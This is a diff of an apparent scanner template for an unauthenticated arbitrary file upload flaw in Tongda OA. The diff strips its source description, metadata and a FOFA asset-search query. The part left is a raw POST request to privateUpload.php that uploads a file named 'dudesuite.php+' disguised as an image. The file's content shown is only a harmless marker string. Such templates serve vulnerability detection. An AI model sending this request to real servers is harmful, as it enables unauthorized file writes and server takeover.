@@ -3,12 +3,8 @@ info:
   name: 通达OA privateUpload 前台任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xwop5xd4rxv0gewt'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xwop5xd4rxv0gewt
-    fofa: app.name="通达 OA"
 http:
 - raw:
   - 'POST /general/vmeet/privateUpload.php?fileName=dudesuite.php+ HTTP/1.1
@@ -23,8 +19,6 @@ http:
     Connection: close
 
 
-
-
     --00content0boundary00
 
 
@@ -32,8 +26,6 @@ http:
 
 
     Content-Type: image/png
-
-
 
 
     dudesuite
